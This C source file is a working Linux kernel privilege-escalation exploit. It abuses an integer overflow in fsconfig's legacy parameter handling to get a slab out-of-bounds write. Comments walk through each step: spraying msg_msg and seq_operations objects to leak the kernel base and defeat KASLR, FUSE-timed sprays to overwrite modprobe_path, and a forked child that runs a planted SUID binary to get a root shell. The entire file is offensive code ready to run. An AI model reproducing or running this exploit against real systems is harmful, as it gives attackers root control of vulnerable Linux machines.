#define _GNU_SOURCE
#include <sys/syscall.h>
#include <stdlib.h>
#include <unistd.h>

#include "utils.h"
#include <sys/mman.h>
#include <sys/types.h>
#include <sys/wait.h>

#ifndef __NR_fsconfig
#define __NR_fsconfig 431
#endif
#ifndef __NR_fsopen
#define __NR_fsopen 430
#endif
#define FSCONFIG_SET_STRING 1
#define fsopen(name, flags) syscall(__NR_fsopen, name, flags)
#define fsconfig(fd, cmd, key, value, aux) syscall(__NR_fsconfig, fd, cmd, key, value, aux)

uint64_t modprobe_path;

int prepare_vuln() {
    char buff[194];
    int fd = fsopen("ext4", 0);
    if (fd < 0) {
        ERROR("Failed to open ext4 filesystem");
        perror("fsopen");
        exit(1);
    }

    // fill ctx->legacy_params until it's exactly 4095 -> then overflow is possible
    // max length of the buffer (later parsed into param->string) can be 255 (plus one terminating null byte)
    // we take the largest divisor 4095 of smaller than 255, which is 195 -> take string of 193 + 2 (=,)
    memset(buff, 'A', sizeof(buff));
    buff[sizeof(buff)-1] = '\x00';
    INFO("Preparing to trigger the integer overflow");
    for (int i = 0; i < 21; i++) {
        fsconfig(fd, FSCONFIG_SET_STRING, "\x00", buff, 0);
    }
    return fd;
}

u_int64_t leak_kbase() {
    int fd;
    int err;
    int qids[N_SPRAY_MSG];
    char buff[26];

    // spray first batch of msg_msg structs
    err = spray_msg(N_SPRAY_MSG / 2, MSG_SIZE, qids, 0);
    if (err) {
        ERROR("Failed to spray first batch of msg_msg");
        exit(1);
    }

    // prepare to trigger vulnerability: fill ctx->legacy_params until it's exactly 4095 bytes long
    fd = prepare_vuln();

    // spray second batch of msg_msg structs
    err = spray_msg(N_SPRAY_MSG / 2, MSG_SIZE, qids, N_SPRAY_MSG / 2);
    if (err) {
        ERROR("Failed to spray second batch of msg_msg");
        close(fd);
        exit(1);
    }

    // trigger vulnerability (integer overflow to achieve slab out-of-bounds write)
    // the data must have  1 + 24 - 2 = 23 bytes of padding, and then the fake size
    memset(buff, 'C', 23);
    buff[23] = (char)(FAKE_SIZE & 0xff);
    buff[24] = (char)((FAKE_SIZE & 0xff00) >> 8);
    buff[25] = '\x00';

    // this last call to fsconfig will first write ,= (so ctx->legacy_params will have length 4096 + 24)
    // and then FAKE_SIZE will be written to the offset of m_ts
    fsconfig(fd, FSCONFIG_SET_STRING, "\x00", buff, 0);

    // spray objects to be leaked in kmalloc-32
    // in this case we spray seq_operations structs, simply by opening /proc/self/stat many times
    // we spray 128 seq_operations objects because then we are sure we fill up at least a whole kmalloc-32 slab
    for (int i = 0; i < 128; i++) {
        open("/proc/self/stat", O_RDONLY);
    }

    // receive all the sent msg_msg structs to get the leak (the one with the fake size)
    msgbuf recvd;
    for (int i = 0; i < N_SPRAY_MSG; i++) {
        err = msgrcv(qids[i], &recvd, FAKE_SIZE, 0, IPC_NOWAIT | MSG_COPY | MSG_NOERROR);
        if (err == -1) {
            ERROR("Failed to receive sprayed msg_msg objects");
            perror("msgrcv");
            close(fd);
            exit(1);
        }

        // read first quadword just after the message that we sent, which should be the KASLR leak
        u_int64_t leak = *(u_int64_t *) (recvd.mtext + MSG_SIZE);
        // check leak, if it starts with 0xffffffff it's most probably the correct kernel address
        if (leak >> 32 == 0xffffffff){
            close(fd);
            return leak - SINGLE_START_OFFSET;
        }
    }
    INFO("No leak found, retrying");
    close(fd);
    return 0;
}

void overwrite_modprobe_path() {
    int fd;
    int err;
    pthread_t threads[N_SPRAY_MSG];
    char buff[40];

    start_fuse();

    // spray first batch of fuse-backed msg_msg structs in different threads
    // msg_len = (size that fills a kmalloc-4k object) + (number of bytes of the new modprobe_path) + (1 null byte)
    int msg_len = 0xfd0 + strlen(COMPILE_SUID) + 1;
    err = spray_msg_threaded(N_SPRAY_MSG / 2, msg_len, threads, 0, send_fuse_msg);
    if (err) {
        ERROR("Failed to spray first batch of fuse msg_msg");
        fuse_cleanup();
        exit(1);
    }

    // prepare to trigger vulnerability: fill ctx->legacy_params until it's exactly 4095 bytes long
    fd = prepare_vuln();

    // spray second batch of fuse-backed msg_msg structs in different threads
    err = spray_msg_threaded(N_SPRAY_MSG / 2, msg_len, threads, N_SPRAY_MSG / 2, send_fuse_msg);
    if (err) {
        ERROR("Failed to spray first batch of fuse msg_msg");
        fuse_cleanup();
        exit(1);
    }

    // wait until fuse handler has been called for all msgs
    wait_for_fuse_signals();

    // trigger vulnerability (integer overflow to achieve slab out-of-bounds write)
    // the data must have 1 + 32 - 2 = 31 bytes of padding, and then the fake next pointer
    INFO("Triggering integer overflow...");
    uint64_t target_address = modprobe_path - 0x8;
    memset(buff, 'C', 31);
    memcpy(buff + 31, (void *)&target_address, 8);
    buff[39] = '\x00';

    // this last call to fsconfig will first write ,= (so ctx->legacy_params will have length 4096 + 32)
    // and then target_address will be written to the offset of the next pointer
    fsconfig(fd, FSCONFIG_SET_STRING, "\x00", buff, 0);

    // signal fuse handlers to proceed, which will copy the data of the msgs. one will have the fake next pointer, and
    // thus modprobe_path will be overwritten with our data
    send_signals_to_fuse();

    // wait for all threads to finish and clean up
    for (int i = 0; i < N_SPRAY_MSG; i++) {
        pthread_join(threads[i], NULL);
    }
    fuse_cleanup();
}

int main(int argc, char **argv, char **envp) {
    int err;
    u_int64_t kbase = 0;

    // fork process before unsharing. child will be checking for presence of suid binary and execute it when it's ready
    pid_t shell_pid = fork();
    if (shell_pid == 0) {
        struct stat statbuf;
        do {
            stat(SUID, &statbuf);
        } while (stat(SUID, &statbuf) != 0 || !(statbuf.st_mode & S_ISUID));
        sleep(1);
        system(SUID);
        return 0;
    }

    // step 0: setup: assign a single CPU, unshare, drop files
    assign_to_core(0);
    unshare_and_map_user(getuid(), getgid());
    drop_modprobe_files();

    // step 1: kernel leak
    // first we spray some msg_msg to fill any partial slabs
    err = spray_msg(16, 0x1000-0x30, NULL, 0);
    if (err) {
        ERROR("Failed to spray msg_msg to fill all partial slabs");
        exit(1);
    }
    // execute kernel leak until successful
    while (kbase == 0) {
        kbase = leak_kbase();
    }
    modprobe_path = kbase + MODPROBE_PATH_OFFSET;
    INFO("Found kernel base: 0x%lx", kbase);
    INFO("modprobe_path address: 0x%lx", modprobe_path);

    // step 2: arbitrary write
    while (1) {
        overwrite_modprobe_path();
        // step 3: trigger hijacked modprobe and drop SUID shell
        if (exec_modprobe_trigger())
            break;
        INFO("modeprobe_path was not overwritten. Trying again");
    }

    INFO("SUID binary has been created! Popping root shell");
    // wait until we return from the root shell in child process, and exit
    waitpid(shell_pid, NULL, 0);
    return 0;
}